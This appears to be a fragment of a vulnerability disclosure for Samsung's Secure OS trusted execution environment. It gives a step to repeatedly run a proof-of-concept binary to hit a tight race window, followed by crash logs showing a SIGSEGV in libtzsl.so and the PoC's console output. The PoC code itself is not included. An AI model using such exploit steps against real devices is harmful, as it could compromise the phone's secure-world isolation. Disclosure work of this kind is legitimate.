reboot device and run a bunch of times (race window is tight):

```
6,24162,115703747,-,caller=T254;SW> Samsung Secure OS Release Version 6.0.0.0 built on: 2025-02-07 19:23:42, binary version: 6a170c41
6,24163,115703766,-,caller=T254;SW> Th#43 of Pid=27 panicked with signal: 11 (SIGSEGV)
6,24164,115703774,-,caller=T254;SW> Fault addr 0x00000013db0fd000 in module /lib64/libtzsl.so
```

```
a56x:/ # /data/local/tmp/poc
Unable to detect domain.
shm ptr 0x7d0f947000
params: 0x6c
Unable to detect domain.
TEEC_Result: ffff3024 origin: err_origin: 3
``` 
